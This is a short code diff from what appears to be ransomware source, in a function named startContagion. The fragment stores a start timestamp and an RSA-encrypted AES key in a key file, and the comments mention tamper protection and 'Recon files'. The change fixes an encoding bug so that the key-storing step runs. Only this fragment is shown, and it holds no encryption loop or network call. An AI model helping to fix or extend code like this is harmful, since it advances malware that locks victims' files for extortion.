@@ -66,7 +66,7 @@ def startContagion(path,rsapublickey):
 
     with open(utils.aesIV_file_store_path,"ab") as key_storing_file:
         # protection of starting time against manipulation
-        key_storing_file.write(base64.b64encode(utils.when_did_i_work)+b"\n")
+        key_storing_file.write(base64.b64encode(utils.when_did_i_work.encode())+b"\n")
         # write the AES key to our IV - File storage file
         key_storing_file.write(base64.b64encode(rsa_cipher.encrypt(aeskey)) + b"\n")
         # Recon files
